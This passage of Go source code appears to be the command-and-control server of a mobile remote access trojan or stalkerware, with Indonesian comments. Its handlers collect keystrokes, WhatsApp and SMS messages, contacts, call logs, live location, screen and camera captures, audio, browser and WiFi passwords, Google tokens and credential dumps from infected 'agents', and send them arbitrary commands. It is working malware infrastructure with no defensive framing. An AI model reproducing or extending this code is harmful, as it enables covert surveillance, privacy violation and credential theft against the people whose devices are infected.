        "timestamp": time.Now().Unix(),
    }

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket location history broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}



// server.go - Tambahkan di bagian ADDITIONAL HANDLERS

// ==================== BROWSER HANDLERS ====================

func (s *Server) handleBrowserInfo(agent *Agent, result map[string]interface{}) {
    log.Printf("🌐 Browser info from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("🌐 Browsers found: %d", int(count))
    }
    if agent.Metadata == nil {
        agent.Metadata = make(map[string]interface{})
    }
    agent.Metadata["browser_info"] = result
    s.db.UpdateAgentMetadata(agent.ID, "browser_info", result)
}

func (s *Server) handleBrowserHistory(agent *Agent, result map[string]interface{}) {
    log.Printf("🌐 Browser history from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("🌐 History entries: %d", int(count))
    }
    agent.Metadata["browser_history"] = result
    s.db.UpdateAgentMetadata(agent.ID, "browser_history", result)
}

func (s *Server) handleBrowserBookmarks(agent *Agent, result map[string]interface{}) {
    log.Printf("🔖 Browser bookmarks from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("🔖 Bookmarks: %d", int(count))
    }
    agent.Metadata["browser_bookmarks"] = result
    s.db.UpdateAgentMetadata(agent.ID, "browser_bookmarks", result)
}

func (s *Server) handleBrowserTabs(agent *Agent, result map[string]interface{}) {
    log.Printf("📑 Browser tabs from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("📑 Open tabs: %d", int(count))
    }
    agent.Metadata["browser_tabs"] = result
    s.db.UpdateAgentMetadata(agent.ID, "browser_tabs", result)
}

func (s *Server) handleBrowserAll(agent *Agent, result map[string]interface{}) {
    log.Printf("🌐 All browser data from %s", agent.ID)
    agent.Metadata["browser_all"] = result
    s.db.UpdateAgentMetadata(agent.ID, "browser_all", result)
}

// ==================== FILE OPERATIONS HANDLERS ====================

func (s *Server) handleDeleteFileResponse(agent *Agent, result map[string]interface{}) {
    log.Printf("🗑️ Delete file response from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if deleted, ok := result["deleted"].(bool); ok && deleted {
            path, _ := result["path"].(string)
            log.Printf("🗑️ File deleted: %s", path)
        }
    } else {
        msg := "unknown error"
        if m, ok := result["message"].(string); ok {
            msg = m
        }
        log.Printf("🗑️ Delete failed: %s", msg)
    }
}

func (s *Server) handleMoveFileResponse(agent *Agent, result map[string]interface{}) {
    log.Printf("📦 Move file response from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if moved, ok := result["moved"].(bool); ok && moved {
            source, _ := result["source"].(string)
            dest, _ := result["destination"].(string)
            log.Printf("📦 File moved: %s -> %s", source, dest)
        }
    } else {
        msg := "unknown error"
        if m, ok := result["message"].(string); ok {
            msg = m
        }
        log.Printf("📦 Move failed: %s", msg)
    }
}

// ==================== SOCIAL MESSAGE HANDLER ====================

func (s *Server) handleSocialMessage(agent *Agent, msg Message) {
    log.Printf("📱 Processing social message from %s", agent.ID)
    
    var data map[string]interface{}
    
    // ✅ CEK DATA DI ROOT
    if len(msg.Raw) > 0 {
        var rawData map[string]interface{}
        if err := json.Unmarshal(msg.Raw, &rawData); err == nil {
            if _, ok := rawData["app_name"]; ok {
                data = rawData
                log.Printf("✅ Data found in root")
            }
        }
    }
    
    // ✅ CEK DATA DI FIELD "data"
    if data == nil && len(msg.Data) > 0 {
        if err := json.Unmarshal(msg.Data, &data); err != nil {
            log.Printf("❌ Invalid social message data: %v", err)
            return
        }
        log.Printf("✅ Data found in 'data' field")
    }
    
    // ✅ FALLBACK
    if data == nil {
        log.Printf("❌ No data found in social message")
        return
    }
    
    appName, _ := data["app_name"].(string)
    packageName, _ := data["package_name"].(string)
    sender, _ := data["sender"].(string)
    message, _ := data["message"].(string)
    timestamp, _ := data["timestamp"].(string)
    platform, _ := data["platform"].(string)
    
    if sender == "" {
        sender = "Unknown"
    }
    if message == "" {
        message = "(empty message)"
    }
    if appName == "" {
        appName = packageName
        if appName == "" {
            appName = "Social"
        }
    }
    if platform == "" {
        platform = "other"
    }
    if timestamp == "" {
        timestamp = time.Now().Format("2006-01-02 15:04:05")
    }
    
    if agent.WhatsApp == nil {
        agent.WhatsApp = &WhatsAppData{
            Messages:     []string{},
            MessageCount: 0,
        }
    }
    
    formatted := fmt.Sprintf("[%s] %s - %s: %s", timestamp, appName, sender, message)
    agent.WhatsApp.Messages = append(agent.WhatsApp.Messages, formatted)
    agent.WhatsApp.MessageCount++
    agent.WhatsApp.Capturing = true
    agent.LastSeen = time.Now()
    
    if len(agent.WhatsApp.Messages) > 1000 {
        agent.WhatsApp.Messages = agent.WhatsApp.Messages[len(agent.WhatsApp.Messages)-1000:]
    }
    
    log.Printf("💬 %s message from %s: %s", appName, sender, message[:min(len(message), 50)])
    
    BroadcastSocialMessage(agent.ID, appName, platform, sender, message, timestamp)
    s.db.AddWhatsAppMessages(agent.ID, formatted)
    
    BroadcastAgentUpdate(agent)
}

// ==================== HANDLER FUNCTIONS ====================

func (s *Server) handleDeviceInfo(agent *Agent, result map[string]interface{}) {
    agent.Metadata["device_info"] = result
    s.db.UpdateAgentMetadata(agent.ID, "device_info", result)
}

func (s *Server) handleLocation(agent *Agent, result map[string]interface{}) {
    if lat, ok := result["latitude"].(float64); ok {
        if lng, ok := result["longitude"].(float64); ok {
            s.db.UpdateAgentLocation(agent.ID, lat, lng)
            agent.Metadata["location"] = result
        }
    }
}

func (s *Server) handleWhatsAppDump(agent *Agent, result map[string]interface{}) {
    if messages, ok := result["messages"].(string); ok {
        agent.WhatsApp.Messages = append(agent.WhatsApp.Messages, messages)
        agent.WhatsApp.MessageCount += len(strings.Split(messages, "\n"))
        s.db.AddWhatsAppMessages(agent.ID, messages)
    }
}

func (s *Server) handleScreenshot(agent *Agent, result map[string]interface{}) {
    if imageData, ok := result["image_data"].(string); ok {
        s.db.AddScreenshot(agent.ID, imageData, result)
    }
}

func (s *Server) handleCameraSnapshot(agent *Agent, result map[string]interface{}) {
    if imageData, ok := result["image_data"].(string); ok {
        s.db.AddCameraSnapshot(agent.ID, imageData, result)
    }
}

// server.go - Ganti method handleScreenFrame()

func (s *Server) handleScreenFrame(agent *Agent, result map[string]interface{}) {
    // ✅ CEK BERBAGAI FORMAT DATA
    var frameData string
    
    // Cek di field "data"
    if data, ok := result["data"].(string); ok {
        frameData = data
    } else if data, ok := result["frame_data"].(string); ok {
        frameData = data
    } else if data, ok := result["image_data"].(string); ok {
        frameData = data
    }
    
    // ✅ CEK JUGA DI NESTED OBJECT
    if frameData == "" {
        if frameObj, ok := result["frame"].(map[string]interface{}); ok {
            if data, ok := frameObj["data"].(string); ok {
                frameData = data
            }
        }
    }
    
    if frameData != "" && len(frameData) > 100 {
        agent.FrameCount++
        log.Printf("✅ Frame #%d from %s, size: %d bytes", agent.FrameCount, agent.ID, len(frameData))
        s.db.AddScreenFrame(agent.ID, frameData, result)
        
        // ✅ BROADCAST DENGAN FORMAT YANG BENAR
        BroadcastFrame(agent.ID, result)
        
        // ✅ UPDATE AGENT STATUS
        agent.Mirroring = true
        s.db.UpdateAgentMirrorStatus(agent.ID, true)
        BroadcastAgentUpdate(agent)
        
    } else {
        log.Printf("⚠️ [FRAME_WARNING] No valid frame data from %s", agent.ID)
        log.Printf("🔍 [DEBUG] Result keys: %v", getKeys(result))
        
        // ✅ LOG UNTUK DEBUG
        for key, val := range result {
            if str, ok := val.(string); ok && len(str) > 100 {
                log.Printf("   Found potential frame data in '%s', size: %d bytes", key, len(str))
                agent.FrameCount++
                s.db.AddScreenFrame(agent.ID, str, result)
                BroadcastFrame(agent.ID, result)
                return
            }
        }
    }
}

// ✅ NEW: Helper function to debug map keys
func getResultKeys(m map[string]interface{}) []string {
    keys := make([]string, 0, len(m))
    for k := range m {
        keys = append(keys, k)
    }
    return keys
}

func (s *Server) handleVideoFrame(agent *Agent, result map[string]interface{}) {
    if frameData, ok := result["data"].(string); ok {
        agent.FrameCount++
        log.Printf("🎬 Video frame #%d from %s, size: %d bytes", agent.FrameCount, agent.ID, len(frameData))
        s.db.AddScreenFrame(agent.ID, frameData, result)
    }
}

func (s *Server) handleMirrorStatus(agent *Agent, msg Message) {
    var status map[string]interface{}
    if err := json.Unmarshal(msg.Data, &status); err != nil {
        return
    }
    if mirrorActive, ok := status["mirror_active"].(bool); ok {
        agent.Mirroring = mirrorActive
        s.db.UpdateAgentMirrorStatus(agent.ID, mirrorActive)
        BroadcastAgentUpdate(agent)
    }
}

func (s *Server) handleKeylog(agent *Agent, msg Message) {
    var keylog map[string]interface{}
    if err := json.Unmarshal(msg.Data, &keylog); err != nil {
        return
    }
    if key, ok := keylog["key"].(string); ok {
        agent.Keylogs = append(agent.Keylogs, key)
        s.db.AddKeylog(agent.ID, key, keylog)
    }
}

func (s *Server) handleWhatsAppDecrypt(agent *Agent, result map[string]interface{}) {
    if decryptedData, ok := result["decrypted_data"].(string); ok {
        s.db.AddWhatsAppDecrypted(agent.ID, decryptedData, result)
    }
}

func (s *Server) handleWhatsAppMessage(agent *Agent, msg Message) {
    var data map[string]interface{}
    
    if len(msg.Data) > 0 {
        if err := json.Unmarshal(msg.Data, &data); err != nil {
            log.Printf("❌ Invalid whatsapp message data: %v", err)
            var rawData map[string]interface{}
            if err := json.Unmarshal(msg.Raw, &rawData); err == nil {
                data = rawData
            }
        }
    } else {
        var rawData map[string]interface{}
        if err := json.Unmarshal(msg.Raw, &rawData); err == nil {
            data = rawData
        }
    }
    
    if data == nil || len(data) == 0 {
        var rootData map[string]interface{}
        if err := json.Unmarshal(msg.Raw, &rootData); err == nil {
            data = rootData
        }
    }
    
    if data == nil || len(data) == 0 {
        log.Printf("❌ No data in whatsapp message")
        return
    }

    agent.LastSeen = time.Now()
    agent.WhatsApp.Capturing = true

    appName, _ := data["app_name"].(string)
    sender, _ := data["sender"].(string)
    message, _ := data["message"].(string)
    timestamp, _ := data["timestamp"].(string)
    
    if timestamp == "" {
        if ts, ok := data["time_ms"].(float64); ok {
            timestamp = time.Unix(int64(ts/1000), 0).Format("2006-01-02 15:04:05")
        } else {
            timestamp = time.Now().Format("2006-01-02 15:04:05")
        }
    }

    if sender == "" {
        sender = "Unknown"
    }
    if message == "" {
        message = "(empty message)"
    }
    if appName == "" {
        appName = "WhatsApp"
    }

    formatted := fmt.Sprintf("[%s] %s - %s: %s", timestamp, appName, sender, message)
    
    agent.WhatsApp.Messages = append(agent.WhatsApp.Messages, formatted)
    agent.WhatsApp.MessageCount++
    
    if len(agent.WhatsApp.Messages) > 1000 {
        agent.WhatsApp.Messages = agent.WhatsApp.Messages[len(agent.WhatsApp.Messages)-1000:]
    }

    log.Printf("💬 WhatsApp message from %s [%s]: %s", sender, appName, message[:min(len(message), 50)])

    BroadcastWhatsAppMessage(agent.ID, appName, sender, message, timestamp)
    s.db.AddWhatsAppMessages(agent.ID, formatted)
}

// ==================== ADDITIONAL HANDLERS ====================

func (s *Server) handleClipboard(agent *Agent, result map[string]interface{}) {
    log.Printf("📋 Clipboard response from %s", agent.ID)
    if content, ok := result["content"].(string); ok {
        log.Printf("📋 Content: %s", content[:min(len(content), 100)])
    }
}

func (s *Server) handleInstalledApps(agent *Agent, result map[string]interface{}) {
    log.Printf("📱 Installed apps response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("📱 Total apps: %d", int(count))
    }
}

func (s *Server) handleContacts(agent *Agent, result map[string]interface{}) {
    log.Printf("👤 Contacts response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("👤 Total contacts: %d", int(count))
    }
}

func (s *Server) handleSMS(agent *Agent, result map[string]interface{}) {
    log.Printf("💬 SMS response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("💬 Total SMS: %d", int(count))
    }
}

func (s *Server) handleCallLogs(agent *Agent, result map[string]interface{}) {
    log.Printf("📞 Call logs response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("📞 Total calls: %d", int(count))
    }
}



func (s *Server) handleFilesList(agent *Agent, result map[string]interface{}) {
    log.Printf("📁 Files list response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("📁 Total files: %d", int(count))
    }
}

func (s *Server) handleRecordAudio(agent *Agent, result map[string]interface{}) {
    log.Printf("🎤 Record audio response from %s", agent.ID)
    if status, ok := result["status"].(string); ok {
        log.Printf("🎤 Status: %s", status)
    }
}

func (s *Server) handleStopRecording(agent *Agent, result map[string]interface{}) {
    log.Printf("⏹️ Stop recording response from %s", agent.ID)
}

func (s *Server) handleSetWallpaper(agent *Agent, result map[string]interface{}) {
    log.Printf("🖼️ Set wallpaper response from %s", agent.ID)
    if status, ok := result["status"].(string); ok {
        log.Printf("🖼️ Status: %s", status)
    }
}

func (s *Server) handleWAInfo(agent *Agent, result map[string]interface{}) {
    log.Printf("💬 WA Info response from %s", agent.ID)
    if installed, ok := result["installed"].(bool); ok {
        log.Printf("💬 Installed: %v", installed)
    }
}

func (s *Server) handleWAContacts(agent *Agent, result map[string]interface{}) {
    log.Printf("👤 WA Contacts response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("👤 Total WA contacts: %d", int(count))
    }
}

func (s *Server) handleWACaptureStart(agent *Agent, result map[string]interface{}) {
    log.Printf("💬 WA Capture Start response from %s", agent.ID)
    agent.WhatsApp.Capturing = true
}

func (s *Server) handleWACaptureStop(agent *Agent, result map[string]interface{}) {
    log.Printf("💬 WA Capture Stop response from %s", agent.ID)
    agent.WhatsApp.Capturing = false
}

func (s *Server) handleWACaptureStats(agent *Agent, result map[string]interface{}) {
    log.Printf("📊 WA Capture Stats from %s", agent.ID)
}

func (s *Server) handleWACaptureClear(agent *Agent, result map[string]interface{}) {
    log.Printf("🗑️ WA Capture Clear from %s", agent.ID)
    agent.WhatsApp.Messages = []string{}
    agent.WhatsApp.MessageCount = 0
}

func (s *Server) handleWABackupInfo(agent *Agent, result map[string]interface{}) {
    log.Printf("💾 WA Backup Info from %s", agent.ID)
}

func (s *Server) handleWAExtractKey(agent *Agent, result map[string]interface{}) {
    log.Printf("🔑 WA Extract Key from %s", agent.ID)
    if status, ok := result["status"].(string); ok {
        log.Printf("🔑 Status: %s", status)
    }
}

func (s *Server) handleGetAccounts(agent *Agent, result map[string]interface{}) {
    log.Printf("👤 Accounts response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("👤 Total accounts: %d", int(count))
    }
}

func (s *Server) handleGetGoogleAccounts(agent *Agent, result map[string]interface{}) {
    log.Printf("🔵 Google Accounts from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("🔵 Total Google accounts: %d", int(count))
    }
}

func (s *Server) handleShowToast(agent *Agent, result map[string]interface{}) {
    log.Printf("🍞 Toast response from %s", agent.ID)
}

func (s *Server) handleHelp(agent *Agent, result map[string]interface{}) {
    log.Printf("❓ Help response from %s", agent.ID)
}
// server.go - Tambahkan fungsi handler di bagian ADDITIONAL HANDLERS

// ==================== FILES HANDLERS ====================

func (s *Server) handleFilesListResponse(agent *Agent, result map[string]interface{}) {
    log.Printf("📁 Files list response from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if count, ok := result["count"].(float64); ok {
            log.Printf("📁 Total files: %d", int(count))
        }
        if path, ok := result["path"].(string); ok {
            log.Printf("📁 Path: %s", path)
        }
        // Simpan ke database
        if err := s.db.AddFilesList(agent.ID, result); err != nil {
            log.Printf("⚠️ Failed to save files list: %v", err)
        }
    } else {
        log.Printf("⚠️ Files list error: %v", result["message"])
    }
}

func (s *Server) handleDownloadFileResponse(agent *Agent, result map[string]interface{}) {
    log.Printf("⬇️ Download response from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if filename, ok := result["filename"].(string); ok {
            size := result["size"]
            log.Printf("⬇️ File downloaded: %s (%v bytes)", filename, size)
        }
        // Simpan ke database
        if err := s.db.AddDownloadedFile(agent.ID, result); err != nil {
            log.Printf("⚠️ Failed to save downloaded file: %v", err)
        }
    } else {
        msg := "unknown error"
        if m, ok := result["message"].(string); ok {
            msg = m
        }
        log.Printf("⬇️ Download failed: %s", msg)
    }
}

// handler.go - Tambahkan di bagian broadcast functions:

// ==================== ACCOUNTS BROADCAST ====================

func BroadcastAccounts(agentID string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "accounts_data",
        "agent_id":  agentID,
        "data":      result,
        "timestamp": time.Now().Unix(),
    }

    log.Printf("👤 Broadcasting accounts data for %s to %d clients", agentID, len(wsClients))

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket accounts broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

func BroadcastGoogleAccounts(agentID string, result map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()

    data := map[string]interface{}{
        "type":      "google_accounts_data",
        "agent_id":  agentID,
        "data":      result,
        "timestamp": time.Now().Unix(),
    }

    log.Printf("🔵 Broadcasting Google accounts for %s to %d clients", agentID, len(wsClients))

    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket Google accounts broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

// ==================== CAMERA FRAME HANDLER ====================
// ==================== CREDENTIALS HANDLERS ====================

func (s *Server) handleDumpCredentials(agent *Agent, result map[string]interface{}) {
    log.Printf("🔐 Credentials dump from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if data, ok := result["data"].([]interface{}); ok {
            log.Printf("🔐 Found %d credential categories", len(data))
            
            // Save to agent metadata
            agent.Metadata["credentials"] = result
            s.db.UpdateAgentMetadata(agent.ID, "credentials", result)
            
            // Broadcast to WebSocket
            BroadcastCredentials(agent.ID, result)
        }
    }
}

func (s *Server) handleWifiPasswords(agent *Agent, result map[string]interface{}) {
    log.Printf("📶 WiFi passwords from %s", agent.ID)
    
    if data, ok := result["data"].([]interface{}); ok {
        log.Printf("📶 Found %d WiFi networks with passwords", len(data))
        
        // Save to metadata
        agent.Metadata["wifi_passwords"] = result
        s.db.UpdateAgentMetadata(agent.ID, "wifi_passwords", result)
        
        // Broadcast
        BroadcastWifiPasswords(agent.ID, result)
    }
}

func (s *Server) handleGallery(agent *Agent, result map[string]interface{}) {
    log.Printf("🖼️ Gallery response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("🖼️ Total images: %d", int(count))
    }
    
    // ✅ BROADCAST KE WEBSOCKET
    BroadcastGallery(agent.ID, result)
}

func (s *Server) handleBrowserPasswords(agent *Agent, result map[string]interface{}) {
    log.Printf("🌐 Browser passwords from %s", agent.ID)
    agent.Metadata["browser_passwords"] = result
    s.db.UpdateAgentMetadata(agent.ID, "browser_passwords", result)
}

func (s *Server) handleGoogleTokens(agent *Agent, result map[string]interface{}) {
    log.Printf("🔵 Google tokens from %s", agent.ID)
    agent.Metadata["google_tokens"] = result
    s.db.UpdateAgentMetadata(agent.ID, "google_tokens", result)
}

// ==================== HANDLE LOCATION UPDATE ====================

func (s *Server) handleLocationUpdate(agent *Agent, result map[string]interface{}) {
    log.Printf("📍 Location update from %s", agent.ID)
    
    // ✅ UPDATE AGENT LOCATION
    if lat, ok := result["latitude"].(float64); ok {
        if lng, ok := result["longitude"].(float64); ok {
            s.db.UpdateAgentLocation(agent.ID, lat, lng)
            log.Printf("📍 Updated location: %.6f, %.6f", lat, lng)
        }
    }
    
    // ✅ SAVE TO HISTORY
    if err := s.db.AddLocationHistory(agent.ID, result); err != nil {
        log.Printf("⚠️ Failed to save location history: %v", err)
    }
    
    // ✅ BROADCAST KE WEBSOCKET
    BroadcastLocationUpdate(agent.ID, result)
    
    // ✅ UPDATE AGENT METADATA
    if agent.Metadata == nil {
        agent.Metadata = make(map[string]interface{})
    }
    agent.Metadata["last_location"] = result
    s.db.UpdateAgentMetadata(agent.ID, "last_location", result)
    
    BroadcastAgentUpdate(agent)
}

// ==================== BROADCAST LOCATION UPDATE ====================

func BroadcastLocationUpdate(agentID string, location map[string]interface{}) {
    wsMutex.Lock()
    defer wsMutex.Unlock()
    
    // ✅ FORMAT DATA UNTUK WEBSOCKET
    data := map[string]interface{}{
        "type": "location_update",
        "agent_id": agentID,
        "data": map[string]interface{}{
            "latitude": location["latitude"],
            "longitude": location["longitude"],
            "accuracy": location["accuracy"],
            "provider": location["provider"],
            "altitude": location["altitude"],
            "speed": location["speed"],
            "bearing": location["bearing"],
            "time": location["time"],
            "timestamp": time.Now().Unix(),
        },
    }
    
    log.Printf("📍 Broadcasting location update for %s: %.6f, %.6f", 
        agentID, 
        location["latitude"].(float64), 
        location["longitude"].(float64))
    
    for conn := range wsClients {
        if err := conn.WriteJSON(data); err != nil {
            log.Printf("WebSocket location broadcast error: %v", err)
            conn.Close()
            delete(wsClients, conn)
        }
    }
}

// ==================== UTILITY ====================

func getKeys(m map[string]interface{}) []string {
    keys := make([]string, 0, len(m))
    for k := range m {
        keys = append(keys, k)
    }
    return keys
}

func (s *Server) addAgent(agent *Agent) {
    if agent == nil || agent.ID == "" {
        return
    }

    s.mutex.Lock()
    defer s.mutex.Unlock()

    // ✅ PENTING: Cek duplikat sebelum tambah
    if _, exists := s.agents[agent.ID]; exists {
        log.Printf("⚠️ Agent %s already exists, skipping duplicate", agent.ID)
        return
    }

    s.agents[agent.ID] = agent
    log.Printf("📊 Total agents: %d", len(s.agents))
    BroadcastAgentUpdate(agent)
}

func (s *Server) removeAgent(agentID string) {
    s.mutex.Lock()
    defer s.mutex.Unlock()
    if agent, ok := s.agents[agentID]; ok {
        agent.Status = "offline"
        s.db.UpdateAgentStatus(agentID, "offline")
        delete(s.agents, agentID)
        log.Printf("📊 Total agents: %d", len(s.agents))
        BroadcastAgentUpdate(agent)
    }
}

func (s *Server) getAgentByID(id string) *Agent {
    s.mutex.RLock()
    defer s.mutex.RUnlock()
    return s.agents[id]
}

func (s *Server) GetAgents() []*Agent {
    s.mutex.RLock()
    defer s.mutex.RUnlock()
    agents := make([]*Agent, 0, len(s.agents))
    for _, agent := range s.agents {
        agents = append(agents, agent)
    }
    return agents
}

func (s *Server) SendCommand(agentID, command, params string) (string, error) {
    agent := s.getAgentByID(agentID)
    if agent == nil {
        return "", fmt.Errorf("agent not found")
    }

    cmdID := generateID()
    fullCommand := command
    if params != "" {
        fullCommand = command + " " + params
    }

    cmd := Command{
        ID:        cmdID,
        Command:   fullCommand,
        Params:    params,
        IssuedAt:  time.Now(),
        Status:    "pending",
    }

    s.db.AddCommand(agentID, cmd)

    cmdJSON, _ := json.Marshal(map[string]interface{}{
        "command": fullCommand,
        "id":      cmdID,
    })

    agent.Writer.WriteString(string(cmdJSON) + "\n")
    agent.Writer.Flush()

    cmd.Status = "sent"
    s.db.UpdateCommandStatus(cmdID, "sent")

    log.Printf("📤 Command sent to %s: %s", agentID, fullCommand)
    return cmdID, nil
}

func generateID() string {
    return fmt.Sprintf("%d_%s", time.Now().UnixNano(), randomString(8))
}

func randomString(n int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[time.Now().UnixNano()%int64(len(letters))]
    }
    return string(b)
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}
